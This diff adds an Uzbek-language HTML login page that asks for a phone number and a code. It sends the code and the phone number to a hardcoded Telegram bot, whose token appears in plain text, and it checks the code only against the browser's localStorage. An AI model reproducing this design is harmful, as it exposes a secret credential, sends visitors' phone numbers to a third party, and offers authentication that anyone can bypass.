@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="style.css">
+    <title>Login</title>
+</head>
+<body>
+    <div class="screen">
+        <h1>TABRIZ | КИРИШ</h1>
+        <input type="tel" id="phone" value="+998">
+        <button class="btn" onclick="sendSMS()">Код олиш</button>
+        <div id="sms-area" style="display:none; margin-top:15px;">
+            <input type="number" id="code" placeholder="Кодни киритинг">
+            <button class="btn" onclick="verify()">Кириш</button>
+        </div>
+    </div>
+    <script>
+        async function sendSMS() {
+            const phone = document.getElementById('phone').value;
+            const code = Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem('v_code', code);
+            localStorage.setItem('u_phone', phone);
+            await fetch(`https://api.telegram.org/bot7927717291:AAG4h_LbZoY-1s2y0_zzNoCFudrU7pPDNas/sendMessage?chat_id=1015769230&text=🔑 Код: ${code}\nТел: ${phone}`);
+            document.getElementById('sms-area').style.display = 'block';
+        }
+        function verify() {
+            if(document.getElementById('code').value == localStorage.getItem('v_code')) {
+                window.location.href = 'cabinet.html';
+            } else alert("Хато!");
+        }
+    </script>
+</body>
+</html>
